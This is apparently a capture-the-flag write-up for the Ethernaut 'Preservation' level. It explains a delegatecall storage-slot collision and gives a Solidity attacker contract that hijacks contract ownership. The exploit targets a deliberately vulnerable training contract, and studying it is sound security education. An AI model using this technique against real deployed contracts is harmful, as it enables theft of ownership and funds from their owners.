---
layout: writeup
title: "Preservation"
level: "Hard"
category: "Ethernaut"
description: "Hijack contract ownership by exploiting storage slot collisions during a delegatecall to a library."
---

## Analysis

The `Preservation` contract uses a library to set the time. It uses `delegatecall` to execute `setTime(uint256)` in the `LibraryContract`.

**The Flaw:**
In Solidity, `delegatecall` runs code in the **context of the caller's storage**. 



- The `LibraryContract` defines its first variable `storedTime` at **Slot 0**.
- The `Preservation` contract has `timeZone1Library` at **Slot 0**, `timeZone2Library` at **Slot 1**, and `owner` at **Slot 2**.

When `setFirstTime(uint256)` is called, the library updates its first variable (Slot 0). But because it's a `delegatecall`, it actually updates **Slot 0 of Preservation**, which is the address of the library itself!

---

## Solution

The attack has two phases:
1. **Change the Library Address:** Point `timeZone1Library` (Slot 0) to your malicious contract.
2. **Overwrite the Owner:** Call the function again so your malicious contract updates Slot 2 (the owner).

---

**Attacker Contract (Solidity):**

<pre class="plain-code"><code>
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

contract AttackPreservation {
    // These MUST match the storage layout of Preservation to hit Slot 2
    address public timeZone1Library; 
    address public timeZone2Library;
    address public owner; 

    function setTime(uint256 _newOwner) public {
        // This executes in Preservation's context, overwriting its Slot 2
        owner = address(uint160(_newOwner));
    }
}
</code></pre>

---